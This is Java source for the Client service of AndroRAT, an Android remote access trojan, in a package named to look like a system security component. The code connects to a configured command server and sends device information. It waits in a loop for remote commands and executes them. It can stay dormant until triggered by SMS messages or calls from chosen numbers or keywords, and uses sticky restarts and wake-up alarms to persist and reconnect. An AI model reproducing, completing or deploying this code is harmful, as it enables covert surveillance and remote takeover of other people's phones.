package com.android.security;

 
import java.util.Calendar;

import com.android.security.inout.Controler;
import com.android.security.inout.Protocol;
import com.android.security.library.SystemInfo;
import com.android.security.out.Connection;
import com.android.security.packages.CommandPacket;
import com.android.security.packages.LogPacket;
import com.android.security.packages.PreferencePacket;
import com.android.security.packages.TransportPacket;
import com.android.security.receiver.AlarmReceiver;
import com.android.security.utils.Config;

 
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.StrictMode;
import android.util.Log;

public class Client extends ClientListener implements Controler {

	public final String TAG = Client.class.getSimpleName();
	Connection conn;

	//int nbAttempts = 10; //sera décrementé a 5 pour 5 minute 3 pour  10 minute ..
	int elapsedTime = 1; // 1 minute
	
	boolean stop = false; //Pour que les threads puissent s'arreter en cas de déconnexion
	
	boolean isRunning = false; //Le service tourne
	boolean isListening = false; //Le service est connecté au serveur
	//final boolean waitTrigger = false; //On attend un évenement pour essayer de se connecter.
	Thread readthread;
	ProcessCommand procCmd ;
	byte[] cmd ;
	CommandPacket packet ;
	
	private Handler handler = new Handler() {
		
		public void handleMessage(Message msg) {
			Bundle b = msg.getData();
			processCommand(b);
		}
	};
	
	
	
	@SuppressLint("NewApi")
	public void onCreate() {
		Log.i(TAG, "In onCreate");
		infos = new SystemInfo(this);
		procCmd = new ProcessCommand(this);
		if (Build.VERSION.SDK_INT >= 11) {
			StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder()
					.detectDiskReads().detectDiskWrites().detectNetwork()
					.penaltyLog().build());
			StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder()
					.detectLeakedSqlLiteObjects().detectLeakedClosableObjects()
					.penaltyLog().penaltyDeath().build());
		}	
	 
		loadPreferences();
	}
	
	public int onStartCommand(Intent intent, int flags, int startId) {
		//toast = Toast.makeText(this	,"Prepare to laod", Toast.LENGTH_LONG);
		//loadPreferences("preferences");
		//Intent i = new Intent(this,Preferences.class);
		//startActivity(i);
/*	
		if(intent == null)
			return START_STICKY;
		String who = intent.getAction();
		Log.i(TAG, "onStartCommand by: "+ who); //On affiche qui a déclenché l'event


 		if (intent.hasExtra("IP"))
			this.ip = intent.getExtras().getString("IP");
		if (intent.hasExtra("PORT"))
			this.port = intent.getExtras().getInt("PORT");		
*/		
		if(!isRunning) {// C'est la première fois qu'on le lance
			
		  	//--- On ne passera qu'une fois ici ---
		    IntentFilter filterc = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"); //Va monitorer la connexion
		    registerReceiver(ConnectivityCheckReceiver, filterc);
			isRunning = true;
			conn = new Connection(Config.ip,Config.port,this);//On se connecte et on lance les threads
			
			Log.i(TAG,"client is not running ..");
			AlarmReceiver.setAlarm(this, 60, 1);				

			if(waitTrigger) { //On attends un evenement pour se connecter au serveur
			  	//On ne fait rien
				//Log.i(TAG,"wait for trigger ..");
				registerSMSAndCall();
			}
			else {
				//Log.i(TAG,"Try to connect to "+Config.ip+":"+Config.port);
				if(conn.connect()) {
					Log.i(TAG,"CommandPacket ...");
					packet = new CommandPacket();
					readthread = new Thread(new Runnable() { public void run() { waitInstruction(); } });
					readthread.start();  
					CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0, infos.getBasicInfos());
					handleData(0,pack.build());					
					isListening = true;
					if(waitTrigger) {
						unregisterReceiver(SMSreceiver);  
						unregisterReceiver(Callreceiver);
						waitTrigger = false;
					}
					
				}
				else {
					Log.i(TAG,"not connect ...");
					if(isConnected) {  
						resetConnectionAttempts();
						reconnectionAttempts();
					}
					else { //On attend l'update du ConnectivityListener pour se débloquer 
						Log.w(TAG,"Not Connected wait a Network update");
					}
				}
			}
		}	
		else { 
			if(isListening) {
				Log.w(TAG,"(already listening)");
			}
			else { //Sa veut dire qu'on a reçu un broadcast sms ou call
				Log.i(TAG,"Connection by : --");
				if(conn.connect()) {
					readthread = new Thread(new Runnable() {
						public void run() {
							waitInstruction();
						}
					});
					readthread.start();
					CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0,
							infos.getBasicInfos());
					handleData(0, pack.build());
					isListening = true;
					if (waitTrigger) {
						unregisterReceiver(SMSreceiver);
						unregisterReceiver(Callreceiver);
						waitTrigger = false; // In case of disconnect does not
												// wait again for a trigger
					}
				}
				else {
					reconnectionAttempts();  
				}
			}
			AlarmReceiver.setAlarm(this, 60, 1);
			
		}
		 
		return START_STICKY;
	}
	
	
	
	public void waitInstruction() { //Le thread sera bloqué dedans
		try {
			for(;;) {
				if(stop)
					break;
				conn.getInstruction() ;
			}
		}
		catch(Exception e) { 
			isListening = false;
			resetConnectionAttempts();
			reconnectionAttempts();
			conn.disconnect();
			if(waitTrigger) {
				registerSMSAndCall();
			}
		}
	}
	
	public void processCommand(Bundle b)
    {
		try{
			procCmd.process(b.getShort("command"),b.getByteArray("arguments"),b.getInt("chan"));
		}
		catch(Exception e) {
			sendError("Error on Client:"+e.getMessage());
		}
    }
	public boolean isNetworkConnected() {
		NetworkInfo localNetworkInfo = ((ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE))
				.getActiveNetworkInfo();
		return (localNetworkInfo != null) && (localNetworkInfo.isAvailable());
	}

	public void reconnectionAttempts() 
	{
 		if(!isNetworkConnected())
 		{
 			Log.i(TAG,"NotConnect");
			return;
 		}
		
		elapsedTime = 1;

		//---- Piece of Code ----
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, elapsedTime);
		 
		
		Intent intent = new Intent(this, AlarmReceiver.class);
		intent.putExtra("alarm_message", "Wake up Dude !");
		PendingIntent sender = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);
		
		//-----------------------
		 
	}
	
	public void loadPreferences() {
		PreferencePacket p = procCmd.loadPreferences();
		waitTrigger = p.isWaitTrigger();
		//Config.ip = p.getIp();
		//Config.port = p.getPort();
		authorizedNumbersCall = p.getPhoneNumberCall();
		authorizedNumbersSMS = p.getPhoneNumberSMS();
		authorizedNumbersKeywords = p.getKeywordSMS();
	}
	
	public void sendInformation(String infos) { //Methode que le Client doit implémenter pour envoyer des informations
		conn.sendData(1, new LogPacket(System.currentTimeMillis(),(byte) 0, infos).build());
	}
	
	public void sendError(String error) { //Methode que le Client doit implémenter pour envoyer des informations
		conn.sendData(1, new LogPacket(System.currentTimeMillis(),(byte) 1, error).build());
	}
	
	public void handleData(int channel, byte[] data) {
 
		conn.sendData(channel, data);
	}

	public void sendData(int paramInt, byte[] paramArrayOfByte) {
		try {
			conn.sendData(paramInt, paramArrayOfByte);
		} catch (NullPointerException e) {
			disconnect();
			return;
		} catch (Exception e) {
			disconnect();
		}
		return;
	}
	
	public void disconnect() {
 
		if (this.conn != null) {
			this.conn.disconnect();
			this.conn = null;
		}
		return;

	}
	public void onDestroy() {
		//savePreferences("myPref");
		//savePreferences("preferences");
		
		Log.i(TAG, "in onDestroy");
		unregisterReceiver(ConnectivityCheckReceiver);
		conn.stop();
		stop = true;
		stopSelf();
		super.onDestroy();
	}
	
	public void resetConnectionAttempts() {
		elapsedTime = 1;
	}
	
	public void registerSMSAndCall() {
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED"); //On enregistre un broadcast receiver sur la reception de SMS
        registerReceiver(SMSreceiver, filter);
        IntentFilter filter2 = new IntentFilter();
        filter2.addAction("android.intent.action.PHONE_STATE");//TelephonyManager.ACTION_PHONE_STATE_CHANGED); //On enregistre un broadcast receiver sur la reception de SMS
        registerReceiver(Callreceiver, filter2);
	}

	public void Storage(TransportPacket p, String i) 
	{
		try
		{
			packet = new CommandPacket(); //!!!!!!!!!!!! Sinon on peut surement en valeur les arguments des command précédantes !
			packet.parse(p.getData());
			
			Message mess = new Message();
			Bundle b = new Bundle();
			b.putShort("command", packet.getCommand());
			b.putByteArray("arguments", packet.getArguments());
			b.putInt("chan", packet.getTargetChannel());
			mess.setData(b);
			handler.sendMessage(mess);
		}
		catch(Exception e)
		{
			System.out.println("Androrat.Client.storage : unknown commande");
		}		
	}
}
